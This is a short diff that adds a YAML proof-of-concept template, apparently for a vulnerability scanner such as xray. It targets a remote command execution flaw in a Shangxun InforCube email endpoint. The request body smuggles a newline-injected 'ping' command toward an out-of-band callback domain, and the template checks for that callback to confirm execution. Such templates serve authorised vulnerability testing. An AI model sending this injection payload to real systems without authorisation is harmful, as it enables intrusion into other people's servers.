@@ -1,0 +1,26 @@
+name: poc-yaml-shangxun-InforCube_RepeatSend-RCE
+transport: http
+
+
+set:
+  reverse: newReverse()
+  reverseDomain: reverse.domain
+
+
+rules:
+  r0:
+    request:
+      method: POST
+      path: /emailapply/RepeatSend
+      headers:
+        User-Agent: Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36
+        Content-Type: application/x-www-form-urlencoded
+      body: id='%0aping {{reverseDomain}}'
+    expression: reverse.wait(1)
+expression: r0()
+
+detail:
+  author: Superhero
+  links:
+    - https://superhero.blog.csdn.net/article/details/140465200
+
